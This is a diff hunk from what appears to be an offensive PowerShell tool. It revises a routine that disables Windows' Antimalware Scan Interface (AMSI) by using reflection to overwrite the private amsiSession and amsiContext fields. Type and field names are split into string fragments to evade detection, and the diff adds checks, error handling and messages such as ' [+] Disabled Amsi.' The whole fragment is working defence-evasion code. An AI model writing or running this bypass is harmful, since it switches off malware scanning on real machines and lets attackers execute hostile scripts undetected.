@@ -192,15 +192,30 @@ param (
 		
 		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed',"NonPublic,Static").GetValue($null)))
 		
-		$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
-		
-		[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession',"NonPublic,Static").SetValue($null,$null)
-		
-		[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext',"NonPublic,Static").SetValue($null, [IntPtr]$a)
-		
+		if ($CheckAmz -eq $False) {
+			
+			Try {
+			
+				$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+			
+				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession',"NonPublic,Static").SetValue($null,$null)
+			
+				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext',"NonPublic,Static").SetValue($null, [IntPtr]$a)
+				
+				$h
+				Write " [+] Disabled Amsi."
+				$h
+				return
+			}
+			Catch {
+				$h
+				Write " [-] An Error has occurred. Unable to disable Amsi."
+				$h
+			}
+		}
 		if ($CheckAmz) {
 			$h
-			Write " [+] Disabled Amsi."
+			Write " [+] Amsi is already disabled."
 			$h
 		}
 	}
